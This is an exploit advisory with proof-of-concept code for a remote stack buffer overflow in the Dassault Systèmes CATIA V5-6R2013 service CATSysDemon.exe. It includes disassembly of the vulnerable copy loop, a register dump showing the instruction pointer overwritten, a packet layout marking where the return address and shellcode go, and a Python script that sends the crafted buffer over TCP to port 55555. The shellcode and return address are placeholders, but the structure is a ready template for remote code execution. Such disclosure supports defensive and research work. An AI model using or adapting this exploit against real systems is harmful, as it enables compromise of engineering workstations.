'''
# Title: Dassault Syst�mes Catia V5-6R2013 "CATV5_Backbone_Bus" Stack Buffer Overflow
# Date: 2-18-2014
# Author: Mohamed Shetta
Email: mshetta |at| live |dot| com
# Vendor Homepage: http://www.3ds.com/products-services/catia/portfolio/catia-v5/latest-release/
# Tested on: Windows 7 & Windows XP
#Vulnerability type: Remote Code Execution
#Vulnerable file: CATSysDemon.exe
#PORT: 55558 Or 55555


---------------------------------------------------------------------------------------------------------
Software Description:

CATIA developed by Dassault Syst�mes (3DS) is the world leading integrated suite of Computer Aided Design (CAD), Engineering (CAE) and Manufacturing (CAM) applications for digital product definition and lifecycle management. CATIA is widely used in aerospace, automotive, shipbuilding, energy and many other industries. CATIA Composites Design is a workbench in CATIA supporting composites design, engineering and manufacture of complex 3D composites parts containing up to thousands of plies each. Specific developments by Dassault Syst�mes allow the transfer of the composites model and determination of anisotropic material properties from the constantly-chaging fiber orientations and ply thicknesses within realistic 3D industrial components. These varying material properties in the component have to be used by numerical codes such as ACEL-NDT and the FE solver based on XLIFE++ for accurate analyses of these parts (note that trivial composites components like flat panels can be analysed by the numerical codes independently).


---------------------------------------------------------------------------------------------------------
Vulnerability Details:

A stack buffer overflow occurs when copying a user supplied input to a fixed size stack buffer.
The copying procedure stops when a null byte is found and no size check is proceeded.

The same copying pattern is used for more than one time in the vulnerable procedure but only the below one can be exploited.

---------------------------------------------------------------------------------------------------------
Vulnerable Code:
EAX contains the User Supplied data.

00406330 |> /8A08 /MOV CL,BYTE PTR DS:[EAX]
00406332 |. |880C02 |MOV BYTE PTR DS:[EDX+EAX],CL
00406335 |. |40 |INC EAX
00406336 |. |84C9 |TEST CL,CL
00406338 |.^\75 F6 \JNZ SHORT 00406330 ; CATSysDe.00406330

----------------------------------------------------------------------------------------------------------
Registers Dumb:

EAX 00000000
ECX FFB26363
EDX FFB28E70
EBX 00A5A7AA ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ESP 00A5A630 ASCII "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
EBP 72106AE1 MSVCR90.strncmp
ESI 00A5A674 ASCII "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
EDI 00A5A678 ASCII "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
EIP 90909090
C 0 ES 002B 32bit 0(FFFFFFFF)
P 0 CS 0023 32bit 0(FFFFFFFF)
A 1 SS 002B 32bit 0(FFFFFFFF)
Z 0 DS 002B 32bit 0(FFFFFFFF)
S 0 FS 0053 32bit FFFAF000(FFF)
T 0 GS 002B 32bit 0(FFFFFFFF)
D 0
O 0
EFL 00000212 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty 0.0
ST1 empty 0.0
ST2 empty 0.0
ST3 empty 0.0
ST4 empty 0.0
ST5 empty 0.0
ST6 empty 0.0
ST7 empty 0.0
3 2 1 0 E S P U O Z D I
FST 0000 Cond 0 0 0 0 Err 0 0 0 0 0 0 0 0 (GT)
FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1

-------------------------------------------------------------------------------------------------------------
Triggering Packet Details:

(Packet) Details

(XXXX)Size of Next Data | (XXXX)Base for pointers, Set to zero for easy of exploitation. | (A*20)Junk | ("AppToBusInitMsg"+"\x00") Required String | (A*48)Junk | ("CATV5_Backbone_Bus"+"\x00")Required String | (B*49)Junk | (00000000)For Valid Message Sequence(0x00403C13) | (c*408)Junk | (XXXXXXXX)RetAdd | (c*357)small case to prevent converting shell code to small case | (Shell) Shell Code

-----------------------------------------------------------------------------------------------------------
Restrictions:
Only the most significant byte in the Return Address can be zero.

------------------------------------------------------------------------------------------------------------
Disclosure timeline:

12/15/2013 - Vendor notified and no response.
2/18/2014 - Public disclosure
'''

#!/usr/bin/env python
  
import socket
import struct
import ctypes

RetAdd="\x90\x90\x90\x90"
Shell="A" *1000
buff= "\x00\x00\x00\x00" + "A" * 20 + "AppToBusInitMsg" +"\x00" + "A" * 48 + "CATV5_Backbone_Bus" +"\x00" + "B"* 49 + "\x00\x00\x00\x00" +"c"* 408 + RetAdd + "c"* 357 + Shell

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.4", 55555))
s.send(struct.pack('>I',len(buff) ))
s.send(buff)
